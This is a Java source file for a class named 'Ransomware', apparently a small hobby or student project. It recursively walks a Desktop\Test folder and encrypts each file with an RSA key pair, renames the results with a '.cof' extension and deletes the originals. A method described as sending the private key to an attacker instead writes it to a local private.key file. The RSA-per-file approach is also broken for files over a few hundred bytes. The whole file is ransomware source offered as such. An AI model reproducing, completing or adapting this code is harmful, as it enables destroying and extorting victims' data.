import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.spec.PKCS8EncodedKeySpec;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

/**
 * 
 * @author Gabriel
 *
 */
public class Ransomware {

	private KeyPairGenerator keyPairGen;
	private KeyPair pair;
	private Cipher cipher;
	private File mainDirectory;

	public Ransomware() {
		setMainDirectory(new File(System.getProperty("user.home") + "\\Desktop\\Test"));
	}

	/**
	 * Kicks off the ransomware
	 */
	public void begin() {
		generateKeys();
		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
			encrypt(mainDirectory.listFiles());
		}
		sendKey();
	}

	/**
	 * Grabs all files and encrypts them. References:
	 * {@link https://www.geeksforgeeks.org/java-program-list-files-directory-nested-sub-directories-recursive-approach/}
	 * 
	 */
	public void encrypt(File[] files) {
		for (int index = 0; index < files.length; index++) {
			if (files[index].isDirectory()) {
				File directory = files[index];
				new Thread() {

					@Override
					public void run() {
						encrypt(directory.listFiles());
					}
				}.start();
			} else if (files[index].isFile()) {
				encryptFile(files[index]);
			}
		}
	}

	/**
	 * Generates the key pair. References:
	 * {@link https://www.tutorialspoint.com/java_cryptography/java_cryptography_encrypting_data.htm}
	 */
	private void generateKeys() {
		try {
			setKeyPairGen(KeyPairGenerator.getInstance("RSA"));
			keyPairGen.initialize(2048);
			setPair(keyPairGen.generateKeyPair());
			setCipher(Cipher.getInstance("RSA/ECB/PKCS1Padding"));
			cipher.init(Cipher.ENCRYPT_MODE, pair.getPublic());

		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * Takes a file and encrypts it.
	 * 
	 * @param file - The file to encrypt
	 */
	private void encryptFile(File file) {
		byte[] encryptedBytes = null;
		try {
			encryptedBytes = cipher.doFinal(getFileInBytes(file));
			File encryptedFile = new File(file.getPath() + ".cof");
			writeToFile(encryptedFile, encryptedBytes);
			file.delete();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return;
		} catch (IllegalBlockSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (BadPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/**
	 * References:
	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
	 * 
	 * @param file - The file to convert
	 * @throws IOException
	 * 
	 */
	private byte[] getFileInBytes(File file) throws IOException {
		FileInputStream fis = new FileInputStream(file);
		byte[] fileBytes = new byte[(int) file.length()];
		fis.read(fileBytes);
		fis.close();
		return fileBytes;
	}

	/**
	 * References:
	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
	 * 
	 * @param file - The file to output to
	 * @throws IOException
	 * 
	 */
	private void writeToFile(File output, byte[] bytesToWrite) throws IOException {
		FileOutputStream fos = new FileOutputStream(output);
		fos.write(bytesToWrite);
		fos.close();
		return;
	}

	/**
	 * Sends the private key to the attacker IP and Port
	 */
	private void sendKey() {

		try {
			writeToFile(new File(mainDirectory.getAbsolutePath() + "\\private.key"),
					new PKCS8EncodedKeySpec(pair.getPrivate().getEncoded()).getEncoded());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public KeyPairGenerator getKeyPairGen() {
		return keyPairGen;
	}

	public void setKeyPairGen(KeyPairGenerator keyPairGen) {
		this.keyPairGen = keyPairGen;
	}

	public KeyPair getPair() {
		return pair;
	}

	public void setPair(KeyPair pair) {
		this.pair = pair;
	}

	public Cipher getCipher() {
		return cipher;
	}

	public void setCipher(Cipher cipher) {
		this.cipher = cipher;
	}

	public File getMainDirectory() {
		return mainDirectory;
	}

	public void setMainDirectory(File mainDirectory) {
		this.mainDirectory = mainDirectory;
	}
}
